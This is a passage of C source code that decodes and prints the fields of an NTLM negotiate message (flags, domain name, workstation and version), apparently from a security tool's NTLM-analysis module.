	kprintf(L"  NegotiateFlags: ");
	kuhl_m_misc_netntlm_descrNegotiateFlags(pNeg->NegotiateFlags);
	if(pNeg->NegotiateFlags & NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED)
	{
		kprintf(L"  DomainName    : ");
		if(pNeg->DomainNameFields.Len)
			kprintf(L"%.*S\n", pNeg->DomainNameFields.Len, (PBYTE) pNeg + pNeg->DomainNameFields.Offset);
		else kprintf(L"<NULL>\n");
	}
	if(pNeg->NegotiateFlags & NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED)
	{
		kprintf(L"  Workstation   : ");
		if(pNeg->WorkstationFields.Len)
			kprintf(L"%.*S\n", pNeg->WorkstationFields.Len, (PBYTE) pNeg + pNeg->WorkstationFields.Offset);
		else kprintf(L"<NULL>\n");
	}
	if(pNeg->NegotiateFlags & NTLMSSP_NEGOTIATE_VERSION)
		kprintf(L"  Version       : %hhu.%hhu (%hu) - rev. %hhu\n", pNeg->Version.ProductMajorVersion, pNeg->Version.ProductMinorVersion, pNeg->Version.ProductBuild, pNeg->Version.NTLMRevisionCurrent);
}